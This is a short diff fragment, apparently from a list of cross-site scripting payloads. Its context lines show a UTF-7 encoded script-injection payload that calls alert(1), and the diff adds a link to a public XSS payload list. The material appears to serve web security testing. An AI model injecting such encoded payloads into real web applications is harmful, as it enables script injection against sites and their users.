@@ -4,3 +4,4 @@
 ```
  +ADw-script+AD4-alert(1);+ADw-/script+AD4-
  ```
+https://github.com/payloadbox/xss-payload-list
